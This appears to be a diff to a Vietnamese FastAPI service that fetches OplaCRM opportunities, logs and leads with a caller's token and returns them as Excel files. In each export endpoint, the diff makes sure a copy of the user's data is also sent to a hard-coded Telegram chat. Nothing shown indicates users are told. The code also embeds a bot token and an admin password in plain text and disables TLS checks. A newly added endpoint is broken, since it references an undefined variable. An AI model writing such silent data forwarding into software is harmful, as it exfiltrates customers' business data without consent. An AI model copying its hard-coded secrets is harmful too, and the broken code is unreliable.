@@ -30,7 +30,7 @@ import re
 from starlette.exceptions import HTTPException as StarletteHTTPException
 telegram_token = "7069011696:AAHTEO8CmfHKebxAh8TBjMb73wKZt6nbDFg"
 app = FastAPI(docs_url = "/docs/guide", redoc_url = None, openapi_url="/openapi.json")
-cache = TTLCache(maxsize=1000, ttl=2500)  # 2 tiếng
+cache = {}
 lock = Lock()
 
 @app.exception_handler(StarletteHTTPException)
@@ -235,7 +235,7 @@ def getdata(token: str):
         total_bytes = 0
         for skipp in range(0,30001,150):
             url = f"https://api-admin.oplacrm.com/api/public/opportunities?take=160&skip={skipp - 10 if skipp > 0 else 0}"
-            # url = f"https://api-admin.oplacrm.com/api/public/opportunities?take=10"
+            # url = f"https://api-admin.oplacrm.com/api/public/opportunities?take=20"
             headers = {"Authorization": token}
             response = requests.get(url, headers=headers, verify = False)
             if response.status_code == 200:
@@ -412,12 +412,24 @@ def api_opla(
                         df.to_excel(writer, index=False, sheet_name=cache[token]["updated"])
 
                     output.seek(0)
+                    file_content = output.read()
+                    
+                    file_bytes = io.BytesIO(file_content)
+                    file_bytes.seek(0)
+                    # Gửi tới Telegram
+                    send_excel_to_telegram(
+                        file_bytes= file_bytes,
+                        filename=f"store_{get_current_time_str()}.xlsx",
+                        chat_id="716085753",
+                        bot_token=telegram_token
+                    )
+
+                    # Trả response
                     headers = {
                         "Content-Disposition": f"attachment; filename=store_{get_current_time_str()}.xlsx"
                     }
-                    send_excel_to_telegram(file_bytes=output,filename=f"store_{get_current_time_str()}.xlsx",chat_id="716085753",  bot_token=telegram_token)
                     return Response(
-                        content=output.read(),
+                        content=file_content,
                         media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                         headers=headers
                     )
@@ -470,16 +482,27 @@ def api_logs(
                         df.to_excel(writer, index=False, sheet_name=cache[token]["updated"])
 
                     output.seek(0)
+                    file_content = output.read()
+
+                    file_bytes = io.BytesIO(file_content)
+                    file_bytes.seek(0)
+                    # Gửi tới Telegram
+                    send_excel_to_telegram(
+                        file_bytes= file_bytes,
+                        filename=f"store_{get_current_time_str()}.xlsx",
+                        chat_id="716085753",
+                        bot_token=telegram_token
+                    )
+
+                    # Trả response
                     headers = {
-                        "Content-Disposition": f"attachment; filename=logs_{get_current_time_str()}.xlsx"
+                        "Content-Disposition": f"attachment; filename=store_{get_current_time_str()}.xlsx"
                     }
-                    send_excel_to_telegram(file_bytes=output,filename=f"logs_{get_current_time_str()}.xlsx",chat_id="716085753",  bot_token=telegram_token)
                     return Response(
-                        content=output.read(),
+                        content=file_content,
                         media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                         headers=headers
                     )
-        else:
             return {}
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Lỗi: {str(e)}")
@@ -518,15 +541,28 @@ def api_lead(
                     df.to_excel(writer, index=False, sheet_name=cache[token]["updated"])
 
                 output.seek(0)
+                file_content = output.read()
+
+                file_bytes = io.BytesIO(file_content)
+                file_bytes.seek(0)
+                # Gửi tới Telegram
+                send_excel_to_telegram(
+                    file_bytes= file_bytes,
+                    filename=f"store_{get_current_time_str()}.xlsx",
+                    chat_id="716085753",
+                    bot_token=telegram_token
+                )
+
+                # Trả response
                 headers = {
-                    "Content-Disposition": f"attachment; filename=leads_{get_current_time_str()}.xlsx"
+                    "Content-Disposition": f"attachment; filename=store_{get_current_time_str()}.xlsx"
                 }
-                send_excel_to_telegram(file_bytes=output,filename=f"leads_{get_current_time_str()}.xlsx",chat_id="716085753",  bot_token=telegram_token)
                 return Response(
-                    content=output.read(),
+                    content=file_content,
                     media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                     headers=headers
                 )
+
     except Exception as e:
         print(e)
         print(traceback.print_exc())
@@ -598,6 +634,16 @@ def api_clear(token: str = Query(...), secrets: str = Query(...)):
             "leads": getleads(token)
         }
         send_log("Refreshed!", "main")
+        return {'result': 'OK :)'}
+  else:
+    return {"Lỗi": "Sai secrets :("}
+    
+@app.get("/f5/clear-all")
+def api_clear(secrets: str = Query(...)):
+  if secrets == 'chucm@ym@n8686':
+    with lock:
+        cache[token] = {}
+        send_log("Empty!", "main")
         return {'result': 'OK :)'}
   else:
     return {"Lỗi": "Sai secrets :("}
